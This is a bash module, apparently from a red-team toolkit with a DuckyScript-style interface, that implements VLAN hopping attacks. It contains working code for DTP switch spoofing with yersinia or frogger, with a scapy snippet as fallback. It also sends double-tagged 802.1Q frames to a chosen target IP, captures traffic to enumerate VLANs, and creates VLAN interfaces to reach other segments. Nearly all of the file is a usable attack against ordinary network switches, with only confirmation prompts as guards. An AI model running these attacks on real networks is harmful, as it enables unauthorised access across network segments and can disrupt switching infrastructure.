#!/bin/bash
# VLAN hopping attacks

rt_vlan_hop() {
  local choice
  choice=$(menu_pick "VLAN Hopping" \
    "Switch Spoofing (DTP)" \
    "Double Tagging" \
    "VLAN Enumeration" \
    "Create VLAN Interface" \
    "Remove VLAN Interface")
  
  case "$choice" in
    1) vlan_dtp_spoof ;;
    2) vlan_double_tag ;;
    3) vlan_enum ;;
    4) vlan_create_iface ;;
    5) vlan_remove_iface ;;
    0|"") return ;;
  esac
}

vlan_dtp_spoof() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Attempt DTP trunk negotiation? This may disrupt network."; then
    return 1
  fi
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Attempting DTP trunk negotiation on $iface..."
  LOG "This exploits switches with dynamic trunking enabled"
  
  if have yersinia; then
    LOG "Running yersinia DTP attack..."
    timeout 30 yersinia dtp -i "$iface" -attack 1 2>&1 | tee "$ARTIFACT_DIR/dtp_attack_$(ts).log"
    
    LOG ""
    LOG "If successful, $iface is now a trunk port"
    LOG "Create VLAN interfaces to access other VLANs"
  elif have frogger; then
    LOG "Running frogger..."
    timeout 30 frogger -i "$iface" 2>&1 | tee "$ARTIFACT_DIR/frogger_$(ts).log"
  else
    LOG red "yersinia or frogger required"
    LOG ""
    LOG "Manual approach using scapy:"
    LOG "  from scapy.all import *"
    LOG "  sendp(Dot3()/LLC()/SNAP()/DTP(status='trunk'), iface='$iface')"
  fi
}

vlan_double_tag() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Send double-tagged frames? This is a one-way attack."; then
    return 1
  fi
  
  local native_vlan
  native_vlan=$(NUMBER_PICKER "Native VLAN (outer tag)" 1)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local target_vlan
  target_vlan=$(NUMBER_PICKER "Target VLAN (inner tag)" 100)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local target_ip
  target_ip=$(IP_PICKER "Target IP in VLAN $target_vlan" "10.0.100.1")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Double tagging attack"
  LOG "Native VLAN: $native_vlan (will be stripped by first switch)"
  LOG "Target VLAN: $target_vlan (forwarded to target)"
  LOG "Target: $target_ip"
  LOG ""
  LOG "NOTE: This is one-way only - no responses will return"
  
  if have yersinia; then
    yersinia dot1q -i "$iface" -attack 1 -vlan1 "$native_vlan" -vlan2 "$target_vlan" 2>&1 | head -20
  elif have scapy; then
    python3 << PYEOF
from scapy.all import *

pkt = Ether()/Dot1Q(vlan=$native_vlan)/Dot1Q(vlan=$target_vlan)/IP(dst="$target_ip")/ICMP()
sendp(pkt, iface="$iface", count=5)
print("Sent 5 double-tagged ICMP packets")
PYEOF
  else
    LOG red "yersinia or scapy required"
    LOG ""
    LOG "Install scapy: pip3 install scapy"
  fi
  
  ensure_dir "$ARTIFACT_DIR"
  {
    echo "=== Double Tagging Attack ==="
    echo "Time: $(date)"
    echo "Native VLAN: $native_vlan"
    echo "Target VLAN: $target_vlan"
    echo "Target IP: $target_ip"
    echo "Interface: $iface"
  } >> "$ARTIFACT_DIR/vlan_attacks.log"
}

vlan_enum() {
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local duration
  duration=$(NUMBER_PICKER "Capture duration (sec)" 60)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Enumerating VLANs on $iface..."
  LOG "Capturing tagged traffic to identify VLAN IDs"
  
  ensure_dir "$ARTIFACT_DIR"
  local outfile="$ARTIFACT_DIR/vlan_enum_$(ts).txt"
  
  {
    echo "=== VLAN Enumeration ==="
    echo "Interface: $iface"
    echo "Time: $(date)"
    echo ""
    
    if have tcpdump; then
      echo "Captured VLAN tags:"
      run_timeboxed "$duration" tcpdump -i "$iface" -e -nn 'vlan' 2>/dev/null | \
        grep -oE 'vlan [0-9]+' | sort | uniq -c | sort -rn
    fi
    
    echo ""
    echo "CDP/LLDP discovered VLANs:"
    run_timeboxed 10 tcpdump -i "$iface" -nn -v 'ether proto 0x88cc or ether host 01:00:0c:cc:cc:cc' 2>/dev/null | \
      grep -iE 'vlan|native' | head -20
      
    echo ""
    echo "DTP frames:"
    run_timeboxed 10 tcpdump -i "$iface" -nn 'ether dst 01:00:0c:cc:cc:cc' 2>/dev/null | head -10
    
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

vlan_create_iface() {
  local parent_iface
  parent_iface=$(TEXT_PICKER "Parent interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local vlan_id
  vlan_id=$(NUMBER_PICKER "VLAN ID" 100)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local ip_addr
  ip_addr=$(TEXT_PICKER "IP address (CIDR)" "10.0.100.50/24")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local vlan_iface="${parent_iface}.${vlan_id}"
  
  LOG blue "Creating VLAN interface $vlan_iface..."
  
  if have ip; then
    ip link add link "$parent_iface" name "$vlan_iface" type vlan id "$vlan_id" 2>/dev/null
    ip addr add "$ip_addr" dev "$vlan_iface" 2>/dev/null
    ip link set "$vlan_iface" up 2>/dev/null
    
    LOG green "Created: $vlan_iface with IP $ip_addr"
    LOG ""
    ip addr show "$vlan_iface"
  elif have vconfig; then
    vconfig add "$parent_iface" "$vlan_id" 2>/dev/null
    ifconfig "$vlan_iface" "$ip_addr" up 2>/dev/null
    LOG green "Created VLAN interface"
  else
    LOG red "ip or vconfig required"
    LOG "Load 8021q module: modprobe 8021q"
  fi
}

vlan_remove_iface() {
  local vlan_iface
  vlan_iface=$(TEXT_PICKER "VLAN interface to remove" "eth0.100")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Removing $vlan_iface..."
  
  if have ip; then
    ip link delete "$vlan_iface" 2>/dev/null
  elif have vconfig; then
    vconfig rem "$vlan_iface" 2>/dev/null
  fi
  
  LOG green "Removed: $vlan_iface"
}
